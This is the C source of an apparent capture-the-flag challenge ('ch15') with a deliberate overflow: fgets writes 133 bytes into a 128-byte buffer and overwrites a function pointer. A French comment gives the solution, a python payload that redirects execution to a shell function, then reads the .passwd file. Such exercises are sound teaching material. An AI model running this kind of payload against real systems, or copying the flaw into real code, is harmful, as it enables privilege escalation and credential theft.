    /*
    
    Résolu grace a : 
    1 :     python -c "print('A'*128 + '\x16\x85\x04\x08')" > /tmp/louiss
    2 :     cat /tmp/louiss - | ./ch15
    3 : puis on est déjà dans le shell admin --> cat .passwd

    
    */
    #include <stdio.h>
    #include <stdlib.h>
    #include <sys/types.h>
    #include <unistd.h>
     
    // 0x08048516
    void shell() {
        setreuid(geteuid(), geteuid());
        system("/bin/bash");
    }
     
    void sup() {
        printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
    }
     
    void main()
    {
        int var;
        void (*func)()=sup;
        char buf[128];
        fgets(buf,133,stdin);
        func();
    }
